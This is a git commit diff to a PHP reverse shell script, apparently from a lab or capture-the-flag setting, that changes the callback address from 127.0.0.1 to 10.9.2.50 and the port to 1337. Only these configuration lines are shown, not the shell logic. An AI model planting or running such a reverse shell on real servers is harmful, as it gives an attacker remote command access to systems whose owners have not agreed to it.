f4fb8e4ea1b3dccc2ec71c450fc40985253459e2
Raj007755 <94738333+Raj007755@users.noreply.github.com>
2021-11-23 11:31:39 +0530

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '10.9.2.50';  // CHANGE THIS
+$port = 1337;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
